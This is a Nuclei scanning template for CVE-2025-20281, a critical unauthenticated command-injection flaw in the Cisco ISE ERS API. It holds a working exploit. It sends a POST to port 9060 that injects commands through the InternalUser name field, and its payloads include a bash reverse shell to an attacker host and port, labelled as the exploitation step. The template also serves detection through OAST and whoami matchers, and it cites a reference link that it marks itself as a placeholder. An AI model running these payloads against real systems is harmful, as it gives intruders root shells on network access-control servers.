id: cve-2025-20281

info:
  name: Cisco ISE < 3.3 Patch 6 / < 3.4 Patch 2 - Unauthenticated RCE
  author: Eslam Abu Bakr @eabubakr21
  severity: critical
  description: |
    A critical unauthenticated remote code execution (RCE) vulnerability exists in Cisco
    Identity Services Engine (ISE) and ISE-PIC versions 3.3 and 3.4.0. The flaw stems
    from insufficient input validation in the ERS API endpoint, allowing an attacker
    to execute arbitrary commands as the root user without any authentication.
  reference:
    - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-rce-2025-20281 # Placeholder link
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-20281
    cwe-id: CWE-78
  tags: cve,cve2025,cisco,ise,rce,oob

# Define variables for the reverse shell payload
variables:
  lhost: "{{interactsh-url}}" # Default to a non-functional OAST URL for safety
  lport: "4444"

requests:
  - method: POST
    # The PoC script targets this specific path. The '#' is part of the path.
    path:
      - "{{BaseURL}}:9060/ers/sdk#_"

    headers:
      Content-Type: application/json

    # Payloads to test for RCE.
    # 1. OAST payload for safe, reliable detection.
    # 2. In-band 'whoami' for secondary detection.
    # 3. Reverse shell payload for exploitation.
    payloads:
      injection:
        - "nslookup {{interactsh-url}}" # OAST Detection
        - "whoami"                     # In-band Detection
        - "/bin/bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1" # Exploitation

    # The 'attack' type 'batteringram' sends one payload per request.
    attack: batteringram

    # The body of the request, injecting the payload using the syntax from the PoC.
    body: '{"InternalUser": {"name": "pwn; {{injection}}; #", "password": "x", "changePassword": false}}'

    # Matchers to confirm the vulnerability.
    # We use multiple matchers. Nuclei will report a match if ANY of these are successful.
    matchers:
      # Matcher 1: OAST Detection (Primary & Most Reliable)
      # This checks if the server made a DNS/HTTP request to our unique Interact.sh URL.
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      # Matcher 2: In-band Detection for 'whoami'
      # This checks if the response body contains the output of the 'whoami' command.
      - type: regex
        part: body
        regex:
          - "(root|admin|cisco)"
        condition: and

      # Matcher 3: Status Code Check for In-band Detection
      # A successful injection might result in a 200 OK or a 500 Server Error.
      - type: status
        status:
          - 200
          - 500
        condition: and

    # Stop processing payloads as soon as one matcher is successful for efficiency.
    stop-at-first-match: true
